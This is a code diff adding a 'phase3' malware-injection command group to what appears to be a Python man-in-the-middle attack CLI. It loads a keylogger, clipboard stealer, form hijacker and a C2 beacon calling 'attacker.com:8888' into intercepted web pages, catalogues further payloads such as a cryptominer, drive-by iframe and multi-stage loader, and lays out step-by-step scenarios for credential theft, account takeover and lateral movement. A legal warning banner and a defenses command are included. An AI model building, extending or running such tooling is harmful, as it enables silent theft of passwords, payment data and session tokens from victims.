@@ -1104,6 +1104,328 @@ def inject_payload(domain):
 cli.add_command(cli_phase2)
 
 
+cli_phase3 = click.Group(name='phase3', help='💉 PHASE 3: Malware & Payload Injection')
+
+@cli_phase3.command()
+def inject_malware():
+    """
+    💉 Inject malicious JavaScript into intercepted web pages.
+
+    Silently injects:
+    • Keyloggers (log every keystroke)
+    • Cryptominers (use victim's CPU to mine crypto)
+    • Beacons (send data to attacker's server)
+    • Form hijackers (capture all form submissions)
+    • Redirects (redirect to phishing/malware)
+    • Iframes (drive-by downloads, exploits)
+
+    ⚠️ EXTREMELY POWERFUL: Malware runs invisibly, victim never knows.
+    """
+    disclaimer = """
+╔══════════════════════════════════════════════════════════════════════╗
+║         💉 MALWARE INJECTION — PHASE 3 ATTACK 💉                    ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║  YOU ARE ABOUT TO:                                                   ║
+║  • Inject malicious JavaScript into web pages                        ║
+║  • Victim will see normal websites with invisible malware            ║
+║  • Malware runs silently in background (no visible signs)           ║
+║                                                                      ║
+║  WHAT MALWARE CAN DO:                                                ║
+║  • Log every keystroke (passwords, credit cards, messages)           ║
+║  • Mine cryptocurrency using victim's CPU                            ║
+║  • Steal browser cookies and authentication tokens                   ║
+║  • Capture all form submissions (logins, payment info)               ║
+║  • Load additional malware                                           ║
+║  • Redirect to phishing/exploit sites                                ║
+║  • Capture clipboard and keystrokes                                  ║
+║  • Hijack file downloads                                             ║
+║                                                                      ║
+║  VICTIM'S EXPERIENCE:                                                 ║
+║  ✓ Websites load normally                                            ║
+║  ✓ Everything seems to work fine                                     ║
+║  ✗ But: CPU usage is high                                            ║
+║  ✗ But: Laptop runs hot/fan loud                                     ║
+║  ✗ But: Battery drains 2x faster                                     ║
+║  ✗ But: All keystroke logged                                         ║
+║  ✗ But: Passwords stolen silently                                    ║
+║                                                                      ║
+║  LEGAL WARNING:                                                       ║
+║  Malware injection is a FEDERAL CRIME (Computer Fraud & Abuse Act).  ║
+║  Unauthorized malware: up to 10 years imprisonment, $250k+ fines.    ║
+║                                                                      ║
+╚══════════════════════════════════════════════════════════════════════╝
+"""
+    console.print(disclaimer, style="bold red")
+
+    response = console.input("\n[yellow]Continue?[/yellow] (type 'yes' to confirm): ").strip().lower()
+    if response != "yes":
+        console.print("[red]Cancelled.[/red]")
+        return
+
+    console.print("\n[bold cyan]💉 MALWARE INJECTION ACTIVE[/bold cyan]")
+    console.print("[yellow]All web pages will now include malicious JavaScript[/yellow]\n")
+
+    try:
+        from malware_injector import MalwareInjector, PayloadLibrary, InjectionType, MalwarePayload
+
+        injector = MalwareInjector()
+
+        console.print("[bold yellow]Loading payload modules:[/bold yellow]\n")
+
+        # Add keylogger
+        keylogger = MalwarePayload(
+            payload_type=InjectionType.KEYLOGGER,
+            name="keystroke_logger",
+            description="Logs every keystroke (passwords, credit cards, messages)",
+            code=PayloadLibrary.keylogger_payload(),
+            target_domains=[]
+        )
+        injector.add_payload(keylogger)
+        console.print("  ✓ Keylogger module loaded")
+
+        # Add clipboard stealer
+        clipboard = MalwarePayload(
+            payload_type=InjectionType.JAVASCRIPT,
+            name="clipboard_stealer",
+            description="Monitors clipboard for sensitive data",
+            code=PayloadLibrary.clipboard_stealer_payload(),
+            target_domains=[]
+        )
+        injector.add_payload(clipboard)
+        console.print("  ✓ Clipboard stealer loaded")
+
+        # Add form hijacker
+        form_hijacker = MalwarePayload(
+            payload_type=InjectionType.FORM_HIJACK,
+            name="form_hijacker",
+            description="Captures all form submissions",
+            code=PayloadLibrary.form_hijacker_payload(),
+            target_domains=[]
+        )
+        injector.add_payload(form_hijacker)
+        console.print("  ✓ Form hijacker loaded")
+
+        # Add beacon
+        beacon = MalwarePayload(
+            payload_type=InjectionType.BEACON,
+            name="c2_beacon",
+            description="Sends data to attacker's C2 server",
+            code=PayloadLibrary.beacon_payload("http://attacker.com:8888/beacon"),
+            target_domains=[]
+        )
+        injector.add_payload(beacon)
+        console.print("  ✓ C2 beacon loaded")
+
+        console.print(f"\n[bold green]✅ INJECTION READY[/bold green]")
+        console.print("[cyan]4 malware payloads loaded and active[/cyan]\n")
+
+        console.print(injector.demonstrate_injection_flow())
+
+        console.print("\n[yellow]Press Ctrl+C to stop injection[/yellow]")
+
+        try:
+            import time
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            console.print("\n[yellow]Stopping malware injection[/yellow]")
+            console.print(injector.get_injection_stats())
+
+    except Exception as e:
+        console.print(f"[red]❌ Error: {e}[/red]")
+        sys.exit(1)
+
+
+@cli_phase3.command()
+def show_payloads():
+    """
+    📋 Display all available malware payloads.
+
+    Shows:
+    • Keylogger (logs every keystroke)
+    • Cryptominer (uses CPU for mining)
+    • Clipboard stealer (monitors clipboard)
+    • Form hijacker (captures form data)
+    • Beacon (C2 communication)
+    • Redirect (phishing redirection)
+    • Iframe injector (drive-by downloads)
+    """
+    console.print("[cyan]💉 Available Malware Payloads[/cyan]\n")
+
+    payloads = [
+        {
+            "name": "Keystroke Logger",
+            "type": "JavaScript Injection",
+            "what": "Logs every key typed",
+            "steals": "Passwords, credit cards, messages, URLs",
+            "code_size": "~500 bytes",
+            "impact": "🔴 CRITICAL - Direct credential theft"
+        },
+        {
+            "name": "Cryptominer",
+            "type": "Monero Miner",
+            "what": "Uses victim's CPU to mine cryptocurrency",
+            "steals": "CPU cycles, electricity, performance",
+            "code_size": "~200 bytes",
+            "impact": "🟠 HIGH - Victim notices slowdown"
+        },
+        {
+            "name": "Clipboard Stealer",
+            "type": "JavaScript Injection",
+            "what": "Reads clipboard every time user copies",
+            "steals": "Passwords pasted, credit cards, personal info",
+            "code_size": "~400 bytes",
+            "impact": "🔴 CRITICAL - Steals copied data"
+        },
+        {
+            "name": "Form Hijacker",
+            "type": "JavaScript Injection",
+            "what": "Intercepts all form submissions",
+            "steals": "Login credentials, payment info, personal data",
+            "code_size": "~600 bytes",
+            "impact": "🔴 CRITICAL - Captures at source"
+        },
+        {
+            "name": "C2 Beacon",
+            "type": "JavaScript",
+            "what": "Sends cookies to attacker server",
+            "steals": "Session tokens, authentication cookies",
+            "code_size": "~300 bytes",
+            "impact": "🔴 CRITICAL - Enables session hijacking"
+        },
+        {
+            "name": "Redirect Injector",
+            "type": "JavaScript",
+            "what": "Redirects to phishing/malware sites",
+            "steals": "Credentials, personal info, system compromise",
+            "code_size": "~200 bytes",
+            "impact": "🔴 CRITICAL - Can compromise device"
+        },
+        {
+            "name": "Iframe Injector",
+            "type": "HTML Injection",
+            "what": "Loads hidden iframe for drive-by download",
+            "steals": "Browser vulnerabilities, can install malware",
+            "code_size": "~150 bytes",
+            "impact": "🔴 CRITICAL - Automatic malware installation"
+        },
+        {
+            "name": "Multi-Stage Loader",
+            "type": "Combined Attack",
+            "what": "Loads additional malware from attacker server",
+            "steals": "Can download ANY malware dynamically",
+            "code_size": "~400 bytes",
+            "impact": "🔴 CRITICAL - Unlimited attack capability"
+        }
+    ]
+
+    for i, payload in enumerate(payloads, 1):
+        console.print(f"[bold yellow]{i}. {payload['name']}[/bold yellow]")
+        console.print(f"   Type: {payload['type']}")
+        console.print(f"   Action: {payload['what']}")
+        console.print(f"   Steals: {payload['steals']}")
+        console.print(f"   Size: {payload['code_size']}")
+        console.print(f"   Impact: {payload['impact']}\n")
+
+    console.print("\n[bold red]⚠️  KEY INSIGHT:[/bold red]\n")
+    console.print("""
+These payloads are TINY (200-600 bytes each).
+But they can be COMBINED into a multi-stage attack:
+
+Stage 1: Inject keylogger (steal credentials)
+Stage 2: Use stolen credentials to upload backdoor
+Stage 3: Backdoor downloads full malware package
+Stage 4: System fully compromised
+
+Total payload in Stage 1: < 1KB
+
+Victim never notices anything until it's too late.
+""")
+
+    console.print("\n[bold cyan]PAYLOAD COMBINATION EXAMPLES:[/bold cyan]\n")
+
+    console.print("""
+[bold]Scenario 1: Credential Theft[/bold]
+  1. Inject keylogger
+  2. Inject form hijacker
+  3. Inject clipboard stealer
+  Result: All credentials captured from multiple sources
+
+[bold]Scenario 2: Account Takeover[/bold]
+  1. Inject keylogger (steal password)
+  2. Inject beacon (send cookies)
+  3. Inject redirect (to fake 2FA page)
+  Result: Complete account compromise
+
+[bold]Scenario 3: Device Malware[/bold]
+  1. Inject iframe (drive-by download)
+  2. Browser exploit (auto-executes)
+  3. Malware installed
+  Result: Full device compromise
+
+[bold]Scenario 4: Silent Espionage[/bold]
+  1. Inject keylogger (background)
+  2. Inject cryptominer (background)
+  3. Inject beacon (background)
+  Result: Victim never knows. Data stolen for weeks/months.
+
+[bold]Scenario 5: Lateral Movement[/bold]
+  1. Inject redirect to IT login page
+  2. Victim enters corporate credentials
+  3. Attacker uses creds for corporate network access
+  Result: Compromises entire organization
+""")
+
+
+@cli_phase3.command()
+def show_injection_flow():
+    """
+    🔄 Demonstrate how malware injection actually works.
+
+    Shows step-by-step flow of:
+    • Normal web request
+    • MITM interception
+    • Payload injection
+    • Malware execution
+    • Data exfiltration
+    """
+    console.print("\n[bold cyan]🔄 HOW MALWARE INJECTION WORKS[/bold cyan]\n")
+
+    try:
+        from malware_injector import MalwareInjector
+        injector = MalwareInjector()
+        console.print(injector.demonstrate_injection_flow())
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/red]")
+
+
+@cli_phase3.command()
+def show_defenses():
+    """
+    🛡️ Show how to defend against malware injection.
+
+    Covers:
+    • Content-Security-Policy headers
+    • Subresource Integrity
+    • Script-blocking extensions
+    • VPN protection
+    • Certificate pinning
+    • And more
+    """
+    console.print("\n[bold cyan]🛡️ DEFENSES AGAINST MALWARE INJECTION[/bold cyan]\n")
+
+    try:
+        from malware_injector import MalwareInjector
+        injector = MalwareInjector()
+        console.print(injector.show_injection_defenses())
+    except Exception as e:
+        console.print(f"[red]Error: {e}[/red]")
+
+
+cli.add_command(cli_phase3)
+
+
 def main():
     """Entry point."""
     # Only require root for commands that actually need it, not for help
